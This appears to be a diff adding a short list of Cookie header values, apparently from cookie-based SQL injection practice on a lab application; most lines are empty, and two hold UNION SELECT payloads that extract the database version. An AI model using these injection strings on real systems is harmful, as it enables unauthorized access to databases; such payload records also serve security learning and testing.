@@ -1,0 +1,16 @@
+Cookie:Dumb
+Cookie:
+Cookie:
+Cookie:
+Cookie:
+Cookie:
+Cookie:
+Cookie:
+Cookie:
+Cookie:
+Cookie:
+Cookie:
+Cookie:
+Cookie:\' union select 1,version()#
+Cookie:
+Cookie:' union select 1,1,version()#
